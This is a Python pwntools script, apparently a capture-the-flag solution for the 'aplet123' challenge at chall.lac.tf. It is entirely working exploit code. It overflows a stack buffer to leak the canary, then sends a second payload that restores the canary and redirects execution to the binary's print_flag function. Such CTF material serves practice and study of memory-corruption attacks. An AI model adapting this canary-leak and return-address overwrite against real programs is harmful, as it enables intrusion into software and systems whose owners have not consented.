#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./aplet123", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc chall.lac.tf 31123"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


env = {}
io = start()

payload = b""
payload = payload.ljust(0x50 - 0x8 - 0x4 + 0x1, b"A")
payload += b"i'm"

io.sendlineafter(b"hello\n", payload)
io.recvuntil(b"hi ")
canary = b"\x00" + io.recv(7)
log.info(f"{canary.hex()}")

payload = b"bye"
payload = payload.ljust(0x50 - 0x8, b"\x00")
payload += flat(
    canary,
    elf.bss(0xc00),
    elf.sym["print_flag"]
)
io.sendline(payload)

io.interactive()
